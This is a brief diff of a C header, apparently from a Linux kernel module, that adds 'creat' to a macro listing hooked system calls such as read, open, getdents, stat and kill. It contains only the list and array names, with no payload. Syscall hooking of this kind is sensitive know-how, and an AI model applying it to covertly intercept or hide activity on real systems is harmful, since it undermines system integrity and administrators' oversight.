@@ -6,9 +6,9 @@
 #include "utils.h"
 #include <asm/unistd.h>
 
-#define HOOKED_SYSCALLS                                                                         \
-    read, pread64, write, sendfile, open, openat, openat2, access, faccessat, faccessat2, stat, \
-        lstat, newfstatat, statx, getdents, getdents64, kill
+#define HOOKED_SYSCALLS                                                                          \
+    read, pread64, write, sendfile, open, openat, openat2, creat, access, faccessat, faccessat2, \
+        stat, lstat, newfstatat, statx, getdents, getdents64, kill
 
 #define P_SYSCALL_HOOKS p_syscall_hooks /* Variable name for the syscall hook array */
 #define P_ORIG_SYSFUNS  p_orig_sysfuns  /* Variable name for the original syscall functions array */
